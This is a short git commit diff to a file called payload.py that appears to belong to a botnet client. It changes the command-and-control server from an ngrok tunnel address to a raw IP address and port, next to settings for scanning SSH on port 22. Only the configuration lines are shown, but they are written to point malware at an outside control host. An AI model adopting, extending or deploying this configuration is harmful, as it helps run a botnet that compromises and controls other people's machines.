2002fa844f33c6f521912e86a9db7c4693585884
kashy01 <87122347+kashy01@users.noreply.github.com>
2021-07-15 16:50:57 +0800

    Update payload.py

--- payload.py
+++ payload.py
@@ -20,8 +20,8 @@ import random
 import threading
 import base64 as b64
 #config
-cnc                  = "0.tcp.ngrok.io"#your cnc ip
-cport                = 13928#your cnc port
+cnc                  = "143.198.112.33"#your cnc ip
+cport                = 696#your cnc port
 scan_ip              = "127.0.0.1"#Recevie the scanned ip
 scan_port            = 606#same
 sport                = 22#Scanning port
